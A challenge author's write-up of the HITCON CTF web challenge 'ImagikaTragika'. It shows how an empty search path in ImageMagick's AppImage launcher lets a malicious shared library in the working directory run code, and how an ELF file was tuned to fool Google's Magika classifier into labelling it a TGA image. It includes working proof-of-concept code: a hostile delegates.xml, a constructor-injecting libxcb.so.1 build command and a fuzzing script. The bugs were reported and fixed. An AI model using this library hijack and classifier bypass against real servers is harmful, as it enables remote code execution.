# ImagikaTragika

* Category: Web, Misc
* Score: 500/500
* Solves: 1/942
* First blood: defunqt2

## Description

Execute `/readflag give me the flag` to get the flag.

## Overview

Players are given a web service that allows users to upload a file, and the server will use the latest version of [ImageMagick](https://github.com/ImageMagick/ImageMagick) to convert the image to a PNG file.

Moreover, the server will use the latest version of [Magika](https://github.com/google/magika) to ensure the uploaded file is an image with a score of 1.0 before feeding it to `ImageMagick`.

Participants need to find a 0day in `ImageMagick` and find a way to bypass `Magika`'s check to get the flag if `Magika` doesn't identify the file as an image.

> While creating this challenge and with HITCON CTF ongoing, the latest version of `ImageMagick` is `7.11-34`, and the latest version of `Magika` is `0.5.1`. To reproduce the challenge, the [Dockerfile](<./challenge/Dockerfile>) needs to be updated to use a vulnerable version of ImageMagick.

## Solution

> You can skip to the folder [exploit](<./exploit>) if you want to check the solution directly; otherwise you will see the step by step progress leading to the solution.

### `APPIMAGE_EXTRACT_AND_RUN`

The first thing you might notice in the [Dockerfile](<./challenge/Dockerfile>) is that it set a strange environment variable called `APPIMAGE_EXTRACT_AND_RUN`:
```dockerfile
# Make ImageMagick happy in the container
ENV APPIMAGE_EXTRACT_AND_RUN 1
```

This is because that `ImageMagick` downloaded from the official website is something called [AppImage](https://en.wikipedia.org/wiki/AppImage), and it requires this environment variable to run correctly without `FUSE` support.

Keep in mind this fact the `ImageMagick` used in this challenge is not just a normal binary, as it will be important later for the first part of the solution.

### Content of current working directory can be controlled

To solve this challenge, we first need to find a way to execute arbitrary code on the server.

In the [main.py](<./challenge/src/main.py>), you can see that the server creates a temporary directory, saves the uploaded file to this directory, and then uses `ImageMagick` to convert the file to a PNG file:
```python
    # No path traversal pls
    if os.path.pardir in file.filename or os.path.sep in file.filename:
        raise HTTPException(status_code=400, detail="Invalid file name")

    temp_dir = pathlib.Path(tempfile.mkdtemp())
    output_dir = temp_dir / secrets.token_hex(16)
    output_dir.mkdir()

    with open(output_dir / file.filename, "wb") as f:
        f.write(await file.read())

    # check with Magika is omitted here

    subprocess.run(["magick", file.filename, "out.png"], cwd=output_dir)
```

Nothing looks suspicious here, but a very important fact is that the current working directory of `ImageMagick` is the directory where the uploaded file is saved, and the filename is not changed when storing the file in the filesystem.

Keep in mind this fact too, as it will be important later for the first part of the solution.

### Insecure search path in `AppImage` version `ImageMagick`

As a security enthusiast, I love using `strace -f` to trace the system calls of a binary and discover interesting behaviors. I do this a lot, especially when trying to find unintended solutions to cheese CTF challenges :p

While participating in WaniCTF 2023, I found an unintended solution using `strace` for the challenge: [certified](https://github.com/wani-hackase/wanictf2023-writeup/tree/main/web/certified2)

My solution exploited the fact that `ImageMagick` tries to access `delegates.xml`, a config used by `ImageMagick` to determine the command to process the file, in the current working directory (cwd).

I initially thought this behavior was just a quirk of `ImageMagick`. However, after a few months, while I was researching the vulnerabilities of a target that installed `ImageMagick` on the system, I discovered it doesn't attempt to access the `delegates.xml` file in the current directory! What's going on?

After some research, I found that the version of `ImageMagick` used in WaniCTF is an `AppImage`, which is a portable version of `ImageMagick`, and also what this challenge uses.
The root cause of the bug is in the `AppRun` script, which serves as the entry point of the `AppImage`.

The problem is in these lines of the `AppRun` script:
```bash
export MAGICK_CONFIGURE_PATH=$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"):$(readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"):$(readlink -f "$HERE/usr/share/ImageMagick-7"):$(readlink -f "$HERE/usr/etc/ImageMagick-7"):$MAGICK_CONFIGURE_PATH #Wildcards don't work

export LD_LIBRARY_PATH=$(readlink -f "$HERE/usr/lib"):$LD_LIBRARY_PATH
export LD_LIBRARY_PATH=${HERE}/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:$LD_LIBRARY_PATH
```
> https://github.com/ImageMagick/ImageMagick/blob/8c7c516574691aec1500ffac0fdfbac87e292aea/app-image/AppRun#L11-L14

If you examine the environment variables after these lines are executed, you can see something like this:

```bash
LD_LIBRARY_PATH=/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/lib/ImageMagick-7.0.9/modules-Q16HDRI/coders:/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/lib:
MAGICK_CONFIGURE_PATH=::/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/share/ImageMagick-7:/tmp/appimage_extracted_b348a3adb4186935f4ba57125e8cd9d8/usr/etc/ImageMagick-7:
```

You can see that there's a strange `::` at the beginning of the `MAGICK_CONFIGURE_PATH`, also `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` end with `:`. Why?

In the code above, the version number is hardcoded in the path to `7.0.9`. If `$HERE/usr/lib/ImageMagick-7.0.9/` does not exist, `readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16"` or `readlink -f "$HERE/usr/lib/ImageMagick-7.0.9/config-Q16HDRI"` will return an empty path.

Additionally, if `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH` are not set before these lines, `AppRun` will append an empty path to `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH`.

What can go wrong with this?

Well, when the search path in these environment variables is an empty path, it actually means that the search path for config and shared library is the **current working directory**!

So if this is the `delegates.xml` in the cwd:
```xml
<delegatemap><delegate xmlns="" decode="XML" command="id"/></delegatemap>
```

By running this command:
```bash
magick delegates.xml out.png 2>/dev/null
```

You should see the output of `id`!

But this won't work in this challenge's environment because we are using the strict [policy.xml](https://imagemagick.org/source/policy-secure.xml) to prevent any delegates.

Fortunately, by loading shared libraries in the current directory, we can still achieve code execution!

If you `strace -f magick /dev/null /dev/null 2>&1 | grep -v '/' | grep 'No such' | grep '\.so'`, you should see `magick` failed to open many shared libraries in the current directory:
```console
$ strace -f magick /dev/null /dev/null 2>&1 | grep -v '/' | grep 'No such' | grep '\.so'
[pid  3463] openat(AT_FDCWD, "libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libc.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libfontconfig.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libfreetype.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libX11.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libz.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libm.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libpthread.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libgcc_s.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libharfbuzz.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libfribidi.so.0", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libstdc++.so.6", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libexpat.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libuuid.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libbrotlidec.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libdl.so.2", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libxcb.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
[pid  3455] openat(AT_FDCWD, "libbrotlicommon.so.1", O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory)
```

So, you just need to pick a shared library that you prefer, insert some malicious function into it, and you can achieve code execution!

I picked `libxcb.so.1` here as the target shared library. You can create a shared library with this command:
```bash
gcc -x c -shared -fPIC -o libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("id");
    exit(0);
}
EOF
```

Then run this command in the same directory:
```bash
magick libxcb.so.1 out.png
```

You should see the output of `id` command!

You might have guessed the solution for the first part of this challenge by now. We can upload shared libraries to execute `/readflag give me the flag > out.png`, and `ImageMagick` will happily load the shared libraries, execute the command, and send back the flag in the `out.png`!

But the job's not finished. There's a check by `Magika`, powered by a state-of-the-art deep learning model by Google, to ensure that the file we uploaded is an image file.

However, our shared library is an ELF file, not an image file. How is it possible for our ELF to be identified as an image file?

### Create adversarial example for Magika

In the [main.py](<./challenge/src/main.py>), this is how the server checks the file type of the uploaded file:
```python
    m = Magika()
    output = m.identify_path(output_dir / file.filename).output
    if output.group != "image" or output.score != 1.0:
        print("Suspicious file detected")
        shutil.rmtree(temp_dir)
        raise HTTPException(status_code=status.HTTP_400_BAD_REQUEST)
```

It calls `Magika` to identify the file type of the uploaded file, and if the file is not recognized as an image or the score is not `1.0`, the server will reject the file.

So, how can we bypass it? Do we need to create an ELF/image polyglot file to confuse the model?

The answer is no, it doesn't need to be that complicated (and I'm not sure if it's possible). Making the model think that the file looks like an image is sufficient.

Let's check how `Magika` extracts the features of the image file:
```python
    @staticmethod
    def _extract_features_from_seekable(
        seekable: Seekable,
        beg_size: int,
        mid_size: int,
        end_size: int,
        padding_token: int,
        block_size: int,
    ) -> ModelFeatures:
        # ... omitted

        if seekable.size < (2 * block_size + mid_size):
            # If the content is small, we take this shortcut to avoid
            # checking for too many corner cases.
            content = seekable.read_at(0, seekable.size)
            content = content.strip()
            beg_content = content
            mid_content = content
            end_content = content

        else:  # seekable.size >= (2 * block_size + mid_size)
            # If the content is big enough, the implementation becomes much
            # simpler. In this path of the code, we know we have enough content
            # to strip up to "block_size" bytes from both sides, and still have
            # enough data for mid_size.

            beg_content = seekable.read_at(0, block_size).lstrip()

            end_content = seekable.read_at(
                seekable.size - block_size, block_size
            ).rstrip()

            # we extract "mid" from the middle of the content that we have not
            # trimmed
            trimmed_beg_bytes_num = block_size - len(beg_content)
            trimmed_end_bytes_num = block_size - len(end_content)
            # mid_idx points to the first byte of the middle block
            mid_idx = (
                trimmed_beg_bytes_num
                + (
                    seekable.size
                    - trimmed_beg_bytes_num
                    - trimmed_end_bytes_num
                    - mid_size
                )
                // 2
            )
            mid_content = seekable.read_at(mid_idx, mid_size)

        beg_ints = Magika._get_beg_ints_with_padding(
            beg_content, beg_size, padding_token
        )
        mid_ints = Magika._get_mid_ints_with_padding(
            mid_content, mid_size, padding_token
        )
        end_ints = Magika._get_end_ints_with_padding(
            end_content, end_size, padding_token
        )

        return ModelFeatures(beg=beg_ints, mid=mid_ints, end=end_ints)
```
> https://github.com/google/magika/blob/7cdd489e17d21c8e3b164a2c8e359ecd81971375/python/magika/magika.py#L263-L337

You can see that when `Magika` handles a large file, it extracts the features of the image file by reading the beginning, middle, and end of the file, and then uses these features to predict the file type.

So the idea is, if we can make these three parts of the file similar to an image file, we can bypass the check, even if all the other parts of the file are clearly not part of an image file.

Which part of the ELF file can we control without breaking the ELF file?

There's a CTF challenge from PlaidCTF 2020 called [golf.so](https://gist.github.com/Strikeskids/7d2ba252a4eeffa9729a644c90107021), which is a code-golfing challenge where you need to write a minimal shared library that can execute the `system("/bin/sh")` command.
By reading the write-ups of the challenge, you can learn how to write a shared library from scratch.

As far as I know, most of the data in the `Elf64_Ehdr` header is difficult to change, which is contained in the `beg_content`. This means we can't control around 0x40 bytes of `beg_content`. However, fortunately, the rest of the ELF file can be easily controlled by manipulating the size and offset of the ELF header and Program Header table.

Now we can simply create a shared library and apply its first 0x40 bytes to the test data under the [google/magika](https://github.com/google/magika) repository, to roughly check when the first 0x40 bytes of a file are similar to an ELF file, but it will still be identified as another file type by `Magika`.

This is how I fuzzed the `Magika` model to find a bypass by using the [tests_data](https://github.com/google/magika/tree/main/tests_data) in [google/magika](https://github.com/google/magika):

```python
import glob
import pathlib

import magika

m = magika.Magika()

# git clone --depth=1 https://github.com/google/magika
all_test_data = glob.glob("magika/tests_data/**/*", recursive=True)
all_test_data = [pathlib.Path(p) for p in all_test_data]
all_test_data = [p for p in all_test_data if p.is_file()]

with open("./libxcb.so.1", "rb") as f:
    # we should be able to control mid_content and end_content
    # so only the Elf64_Ehdr is the key to affect the identification
    target = bytes(f.read()[:0x40])

for p in all_test_data:
    payload = bytearray(p.read_bytes())

    payload[:0x40] = target # replace the first 0x40 bytes with Elf64_Ehdr
    output = (m.identify_bytes(payload).output)
    if output.ct_label != "elf":
        print(p)
        print(output)

```

In the end, only one file is identified as another file type instead of an ELF file.
The output of the fuzzing is:
```console
$ python fuzz.py
magika/tests_data/mitra/footer.tga
MagikaOutputFields(ct_label='tga', score=0.9999125003814697, group='image', mime_type='image/x-tga', magic='Targa image data', description='Targa image data')
```

Luckily, there's a file called `footer.tga` that is identified as a TGA file after replacing it with the ELF file header, and the score is `0.9999125003814697`, almost `1.0`! Why?

I'm not entirely sure, but I think it's because the TGA file's signature is at the end of the file rather than the beginning, and `Magika`'s model might prioritize the footer of the TGA file as a more significant feature than the ELF file header.

> A fun fact is that if you remove the TGA footer from my final payload, the score will be still `1.0`, but the type will be identified as an ELF file.

So, the objective is clear now: we need to craft a shared library where these three parts of the file looks like a TGA file, with the crucial condition that the end of the file matches the TGA footer, `TRUEVISION-XFILE.\0`. This approach should yield a score close to `1.0` and classify the file under the `image` group with `tga` label. Then we can just fine-tune the file content to precisely achieve a score of `1.0` (which is relatively straightforward to accomplish, can be done in a few tries).

Here is the [pwn.s](<./exploit/pwn.s>) that can create such a shared library, you can check the comments in the file to understand how it works.

After compiling with `nasm -f bin -o libxcb.so.1 pwn.s` and checking the file with `Magika`, you should see the output like this:
```console
$ file libxcb.so.1
libxcb.so.1: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), too many section (65535)
$ magika --json libxcb.so.1
[
    {
        "path": "libxcb.so.1",
        "dl": {
            "ct_label": "tga",
            "score": 1.0,
            "group": "image",
            "mime_type": "image/x-tga",
            "magic": "Targa image data",
            "description": "Targa image data"
        },
        "output": {
            "ct_label": "tga",
            "score": 1.0,
            "group": "image",
            "mime_type": "image/x-tga",
            "magic": "Targa image data",
            "description": "Targa image data"
        }
    }
]
```

Great, even though the file is an ELF file for sure, `Magika` now thinks the shared library is a TGA file with `1.0` score, classifying it as an image!

Now we can retrieve the flag by uploading this "image" file. It will be processed by `ImageMagick`, and the flag will be saved in the `out.png` file!

The final exploit is in the [exploit](<./exploit>) folder, you can run it with `bash solve.sh`.

flag: `hitcon{i_hope_you_think_defeating_deep_learning_model_and_finding_realistic_bug_is_fun!_btw_i_hope_your_solution_doesnt_work_with_imagemagick_compiled_from_source_lol}`

## About the bug I used for ImageMagick

I've reported the bug to the ImageMagick team after the CTF and before releasing this write-up, and they have fixed the bug.

Here's the GitHub security advisory for the bug:

https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

Thanks to the ImageMagick team for the quick response and fixing the bug!

## About the adversarial example of Magika

I've reported the issue about TGA file footer to the Magika team, you can find the follow-up discussion in the GitHub issue:

https://github.com/google/magika/issues/596

## Credits

Initially, I thought the challenge might be too straightforward before integrating the `Magika` part, so I wanted to add a layer of complexity.

After discussing with [@maple3142](https://github.com/maple3142), he came up with an idea that we could probably use `Magika` to check the file type and allow players to bypass its check.
(Also, the similarity in names between `Magika` and `ImageMagick` added a fun twist :p)

I thought it was a cool idea and began verifying if the challenge remained solvable with this addition. After successfully exploiting this setup in less than 24 hours, including plenty of breaks, I decided to implement it in the challenge.

Thanks to @maple3142 for the cool idea!
